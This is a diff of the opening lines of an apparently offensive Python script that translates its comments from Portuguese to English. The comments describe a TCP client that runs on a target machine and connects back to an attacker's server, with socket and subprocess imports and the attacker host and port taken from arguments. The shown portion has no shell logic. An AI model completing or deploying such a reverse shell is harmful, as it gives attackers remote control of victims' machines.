@@ -1,9 +1,9 @@
-# client tcp a ser executado na máquina alvo
+# Client tcp for executing in target machine
 import socket
 import subprocess
 import sys
 
-#endereço do servidor da VM atacante
+# Address of attacker server 
 attacker_host = sys.argv[1]
 attacker_port = int(sys.argv[2])
 
